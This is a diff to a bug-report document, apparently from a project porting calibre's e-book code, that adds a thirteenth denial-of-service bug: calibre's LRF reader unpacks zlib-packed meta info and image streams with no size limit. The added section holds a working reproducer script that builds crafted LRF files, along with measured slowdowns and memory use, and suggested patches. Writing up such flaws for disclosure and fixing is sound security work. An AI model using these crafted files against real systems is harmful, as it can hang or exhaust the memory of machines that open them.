@@ -1,10 +1,10 @@
 # Bugs to report to upstream calibre
 
 Status: **not yet reported.** Found **2026-11-17** to **2026-11-19** while porting
-calibre's metadata readers (PRs #179, #185, #188 and #195) and hardening LiuXin's
-own readers and converters (PRs #180, #186 and #193).
+calibre's metadata readers (PRs #179, #185, #188, #195 and #197) and hardening
+LiuXin's own readers and converters (PRs #180, #186, #193 and #198).
 
-These are twelve ways a damaged or hostile file keeps a calibre metadata reader
+These are thirteen ways a damaged or hostile file keeps a calibre metadata reader
 or conversion busy for minutes or for ever, or fills memory. Each section has the
 location, a reproducer to run with `calibre-debug`, what was measured, and a
 suggested fix.
@@ -21,17 +21,18 @@ suggested fix.
 - **Where to report:** calibre takes ordinary bugs on
   [Launchpad](https://bugs.launchpad.net/calibre). Recent security fixes have gone
   through [GitHub security advisories](https://github.com/kovidgoyal/calibre/security/advisories).
-  All twelve are denial of service from a crafted file; bug 9 also runs the
+  All thirteen are denial of service from a crafted file; bug 9 also runs the
   book's text as XPath, though only within the book. That makes them candidates for a
   private advisory rather than a public bug, or for a public bug if calibre
   treats reader hangs as ordinary bugs. Choosing which is the reporter's call.
   Bugs 5 and 7 to 10 also reach calibre's conversion, not only its metadata
-  readers; bug 11 is in conversion alone, and bug 12 reaches PDB conversion
-  too.
+  readers; bug 11 is in conversion alone, and bugs 12 and 13 reach PDB and
+  LRF conversion too.
 - **Order:** bugs 2 and 3 should go together. Fixing 2 lets never-closed info
   blocks reach the patterns in 3, which are then cubic rather than quadratic.
   Bugs 6 to 10 are all in the MOBI reader and could go as one report. Bug 12
   is bug 8's shape in the PDB header reader, and its fix could follow 8's.
+  Bug 13 is bug 7's shape (unpacking without a limit) in the LRF reader.
 
 ## Summary
 
@@ -49,6 +50,7 @@ suggested fix.
 | 10 | `ebooks/mobi/reader/mobi6.py`, clean-up and anchor placement | Eight shapes of markup | Quadratic or worse: from 8.6 s on 3.4 KB to hours on 4 MB |
 | 11 | `ebooks/conversion/preprocess.py` and `utils.py`, the entity and `<pre>` patterns | A run of `&` with no `;` in any HTML file converted; any long text after the last `</pre>`, with heuristics on | Quadratic: 80 KB takes 33 s; 1 MB about an hour and a half |
 | 12 | `ebooks/pdb/header.py`, `PdbHeaderReader.section_data` | A section table whose offsets go back | Each section reads to the end of the file, and the Haodoo reader keeps them all: 1.9 GB for 4,000 sections in 536 KB; a table names up to 65,535 |
+| 13 | `ebooks/lrf/meta.py`, `LRFMetaFile.info`; `ebooks/lrf/objects.py`, `LRFStream.read_stream` | Meta info of millions of empty elements; an image stream of zlib-packed zeros | 48 s for a 6.4 KB book; 1.2 GB for a 408 KB book |
 
 ## 1. Topaz: counts past the end of the file
 
@@ -851,6 +853,135 @@ Books whose sections are in order read exactly as before. Refusing any offset
 that goes back, as LiuXin's own PDB reader does, would also do, and would
 refuse damaged files calibre reads today.
 
+## 13. LRF: meta info and image streams unpack without a limit
+
+An LRF book's meta info is zlib-packed XML after the header, its packed size a
+16-bit field. `LRFMetaFile.info` unpacks it whole and parses it with minidom, and
+every field (`title`, `author`, `publisher` and the rest) reads `info` afresh,
+so `get_metadata` unpacks and parses it about ten times. 64 KB of zlib can
+unpack to 64 MB, and an element per four bytes makes minidom build millions of
+nodes, each time. The size check against `uncompressed_info_size` comes after
+the unpacking, and the book sets both.
+
+`get_metadata` also reads the cover from the first image object, through
+`LRFStream.read_stream` in `ebooks/lrf/objects.py`:
+
+```python
+decomp_size = struct.unpack('<I', self.stream[:4])[0]
+self.stream = zlib.decompress(self.stream[4:])
+if len(self.stream) != decomp_size:
+    raise LRFParseError('Stream decompressed size is wrong!')
+```
+
+The stream is unpacked whole before its declared size is checked, and zlib
+unpacks up to about a thousand times its input. LRF conversion reads its
+streams the same way.
+
+```python
+# lrf_unpack.py: run with calibre-debug -e lrf_unpack.py
+# Two LRF books whose zlib data unpacks without limit: meta info holding millions
+# of elements, parsed once per field read, and a cover image stream of zeros.
+import io
+import resource
+import struct
+import time
+import zlib
+
+from calibre.ebooks.lrf.meta import get_metadata
+
+
+def tag(tag_id, contents=b''):
+    return bytes([tag_id, 0xF5]) + contents
+
+
+def lrf_object(obj_id, obj_type, body):
+    return tag(0x00, struct.pack('<IH', obj_id, obj_type)) + body + tag(0x01)
+
+
+def book(info, stream=None, unpacked=0):
+    objects = []
+    if stream is not None:  # an image (0x0C) whose stream (0x11) is zlib-packed PNG (0x112)
+        objects.append((1, lrf_object(1, 0x0C, tag(0x4C, struct.pack('<I', 2)))))
+        body = struct.pack('<I', unpacked) + stream
+        objects.append((2, lrf_object(2, 0x11, tag(0x54, struct.pack('<H', 0x112)) + tag(0x04, struct.pack('<I', len(body))) + tag(0x05) + body + tag(0x06))))
+    packed = zlib.compress(info)
+    header = bytearray(0x58)
+    header[0:6] = 'LRF'.encode('utf-16le')
+    struct.pack_into('<H', header, 0x08, 1000)
+    struct.pack_into('<H', header, 0x4C, len(packed) + 4)
+    struct.pack_into('<I', header, 0x54, len(info))
+    data = bytes(header) + packed
+    index = b''
+    for obj_id, obj in objects:
+        index += struct.pack('<IIII', obj_id, len(data), len(obj), 0)
+        data += obj
+    data = bytearray(data + index)
+    struct.pack_into('<Q', data, 0x10, len(objects))
+    struct.pack_into('<Q', data, 0x18, len(data) - len(index))
+    return bytes(data)
+
+
+def run(label, data):
+    start = time.monotonic()
+    try:
+        get_metadata(io.BytesIO(data))
+    except Exception as e:
+        print(label, 'raised', type(e).__name__)
+    rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024
+    print(f'{label}: {len(data):,} bytes, {time.monotonic() - start:.2f} s, peak {rss} MB', flush=True)
+
+
+INFO = '<?xml version="1.0"?><Info><BookInfo>{}<Title>T</Title></BookInfo><DocInfo/></Info>'
+for elements in (100_000, 400_000, 1_600_000):
+    run(f'{elements:,} elements of meta info', book(INFO.format('<a/>' * elements).encode()))
+
+for megabytes in (100, 400):
+    packer = zlib.compressobj(9)
+    stream = b''.join(packer.compress(bytes(1 << 20)) for _ in range(megabytes)) + packer.flush()
+    run(f'{megabytes} MB image stream', book(INFO.format('').encode(), stream, megabytes << 20))
+```
+
+**Measured** (calibre's LRF code, as ported, without LiuXin's fixes):
+
+| Book | Bytes | Time | Peak memory |
+|---|---|---|---|
+| 100,000 elements of meta info | 571 | 1.60 s | 74 MB |
+| 400,000 elements | 1,733 | 8.73 s | 120 MB |
+| 1,600,000 elements | 6,407 | 48.01 s | 476 MB |
+| 100 MB image stream | 102,160 | 0.27 s | 564 MB |
+| 400 MB image stream | 407,916 | 0.87 s | 1,164 MB |
+
+A 64 KB book's meta info would take several minutes; a 4 MB image stream would
+unpack to 4 GB (extrapolated, not run).
+
+**Suggested fix:** unpack with a limit and parse once. Real meta info is a few
+kilobytes, so LiuXin's port refuses more than 1 MiB and keeps the parsed
+document until the info is written:
+
+```python
+unpacker = zlib.decompressobj()
+src = unpacker.decompress(self._file.read(size), self.MAX_INFO + 1)
+if len(src) > self.MAX_INFO:
+    raise LRFException('Document meta info unpacks to more than %d bytes' % self.MAX_INFO)
+if not unpacker.eof:
+    raise zlib.error('Error -5 while decompressing data: incomplete or truncated stream')
+```
+
+For streams, unpack no more than the declared size, after refusing a declared
+size past a limit (LiuXin's is 32 MiB):
+
+```python
+if decomp_size > self.MAX_UNPACKED:
+    raise LRFParseError('Stream unpacks to more than %d bytes' % self.MAX_UNPACKED)
+unpacker = zlib.decompressobj()
+self.stream = unpacker.decompress(self.stream[4:], decomp_size + 1)
+if not unpacker.eof and len(self.stream) <= decomp_size:
+    raise zlib.error('Error -5 while decompressing data: incomplete or truncated stream')
+```
+
+Both keep `zlib.decompress`'s error for a truncated stream, and give the same
+results for every book within the limits.
+
 ## LiuXin's own fixes
 
 - PR #180 fixes LiuXin's readers on `main`: `metadata/file_sources/topaz.py`
@@ -872,5 +1003,7 @@ refuse damaged files calibre reads today.
   preprocessor, the heuristic processor and the LRF converter.
 - PR #195 carries the fix for bug 12 in the ported PDB reader. LiuXin's own
   PDB header reader never had it: it refuses offsets that do not increase.
+- PR #197 carries the fixes for bug 13 in the ported LRF reader, and PR #198
+  makes the same fixes to LiuXin's own LRF reader, which had both halves.
 
 Return to the [calibre compatibility index](README.md).
